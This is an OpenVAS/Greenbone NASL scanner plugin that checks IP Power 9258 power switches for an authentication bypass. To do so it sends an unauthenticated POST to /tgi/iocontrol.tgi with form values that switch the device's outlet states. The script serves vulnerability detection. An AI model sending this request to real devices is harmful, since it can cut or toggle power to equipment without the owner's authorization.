# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103172");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-06-06 13:42:32 +0200 (Mon, 06 Jun 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("IP Power 9258 TGI Scripts Unauthorized Access Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48104");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101963/ippower-bypass.txt");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"IP Power 9258 is prone to an unauthorized-access vulnerability.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to directly access arbitrary scripts,
  bypassing authentication. A successful exploit will allow the attacker
  to run arbitrary scripts on the affected device.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port(default:80);

foreach dir(make_list_unique("/", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";
  url = dir + "/";
  buf = http_get_cache(item:url, port:port);

  if("<title>IP9258" >< buf) {

    useragent = http_get_user_agent();
    host = http_host_name(port:port);

    variables = string("XXX=On&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&ButtonName=Apply");

    url = dir + "/tgi/iocontrol.tgi";
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Accept: */*\r\n",
                 "Content-Length: 127\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "\r\n",
                 variables);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(res =~ "<title>I\/O Control" && res =~ "<td>Power1</td>") {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
